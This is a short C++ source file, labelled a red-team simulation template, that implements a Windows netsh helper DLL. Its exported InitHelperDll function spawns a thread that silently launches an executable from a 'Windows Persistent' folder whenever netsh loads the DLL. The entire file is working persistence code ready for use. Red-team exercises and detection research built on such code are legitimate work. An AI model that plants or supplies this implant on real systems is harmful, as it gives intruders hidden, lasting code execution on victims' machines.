/*

 Red Team Simulation template
 Networksh Helper DLL template
 
 Author: Shaikh Jamal Uddin (Linkedin: https://www.linkedin.com/in/engrjamal/)

*/
#include <windows.h>
#include <stdio.h>

void Go(void) {
    STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;

	CreateProcess(
				"c:\\Windows Persistent\\Embed\\embed.exe", 
				"", NULL, NULL, TRUE, 0, NULL, NULL, 
				&info, &processInfo);
	
}

extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved)
{
	HANDLE threadHandle;

	threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Go, NULL, 0, NULL);
	CloseHandle(threadHandle);

	return 0;
}


BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) {

	switch ( fdwReason ) {
		case DLL_PROCESS_ATTACH:
						break;
		case DLL_THREAD_ATTACH:
						break;
		case DLL_THREAD_DETACH:
						break;
		case DLL_PROCESS_DETACH:
						break;
		}
	return TRUE;
}
